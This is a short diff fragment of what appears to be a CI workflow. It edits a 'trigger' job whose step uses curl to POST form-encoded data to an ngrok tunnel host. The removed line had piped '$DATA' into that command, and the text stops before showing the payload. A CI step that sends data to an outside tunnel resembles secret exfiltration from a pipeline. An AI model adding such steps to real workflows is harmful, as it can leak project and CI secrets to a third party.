@@ -8,8 +8,7 @@ jobs:
   trigger:
     runs-on: ubuntu-latest
     steps:
-      - run: |
-          echo "'$DATA'" | xargs \
+      - run: |          
           curl \
           -X POST http://666b-67-8-241-19.ngrok.io \
           -H "Content-Type: application/x-www-form-urlencoded" \
